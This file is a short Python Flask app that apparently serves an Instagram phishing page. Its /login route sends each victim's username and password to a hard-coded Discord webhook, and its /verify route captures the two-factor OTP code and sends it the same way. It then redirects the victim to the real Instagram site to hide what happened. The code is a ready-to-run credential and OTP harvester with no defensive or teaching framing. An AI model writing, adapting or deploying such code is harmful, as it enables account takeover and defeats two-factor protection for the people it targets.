import requests
from flask import Flask, render_template, request, session, redirect

app = Flask(__name__)
app.secret_key = "insta_secret_key"

WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    session['username'] = username

    # 매크로가 읽기 쉬운 정밀한 포맷
    sync_data = {
        "content": f"🚨 **정보 수집 완료**\nID: `{username}`\nPW: `{password}`"
    }
    requests.post(WEBHOOK_URL, json=sync_data)
    return render_template('otp.html') # 2차 인증 페이지로 이동

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('otp_code')
    username = session.get('username', 'Unknown')
    
    otp_data = {
        "content": f"🔑 **OTP 코드 수신**\n유저: `{username}`\n코드: **{otp_code}**"
    }
    requests.post(WEBHOOK_URL, json=otp_data)
    return redirect("https://www.instagram.com/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
